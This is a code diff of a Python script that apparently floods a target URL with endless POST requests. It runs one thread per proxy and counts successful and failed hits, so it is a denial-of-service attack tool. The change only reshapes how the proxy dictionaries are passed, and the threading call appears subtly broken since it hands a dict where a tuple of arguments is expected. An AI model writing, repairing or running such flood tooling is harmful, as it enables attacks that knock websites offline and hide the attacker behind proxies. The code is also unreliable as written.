@@ -31,7 +31,11 @@ with open(file_name, 'r') as f:
 a = 0
 for proxy in proxy_base:
     try:
-        response = requests.post(url, proxies=proxy)
+        proxy_form = {
+            'http': f'http://{proxy}',
+            'https': f'http://{proxy}'
+        }
+        response = requests.post(url, proxies=proxy_form)
         a += response.elapsed.total_seconds()
     except:
         pass
@@ -55,13 +59,9 @@ proxy_use = 0
 def att(pro):
     global o
     global b
-    proxies = {
-        'http': f'http://{pro}',
-        'https': f'http://{pro}'
-    }
     while True:
         try:
-            requests.post(url, timeout=timeout, proxies=proxies)
+            requests.post(url, timeout=timeout, proxies=pro)
             o += 1
         except:
             b += 1
@@ -69,7 +69,12 @@ def att(pro):
 
 while True:
     for i in proxy_base:
-        threading.Thread(target=att, args=i,).start()
+        proxyies = {
+            'http': f'http://{i}',
+            'https': f'http://{i}'
+        }
+
+        threading.Thread(target=att, args=proxyies,).start()
         proxy_use += 1
         if proxy_use == thread:
             break
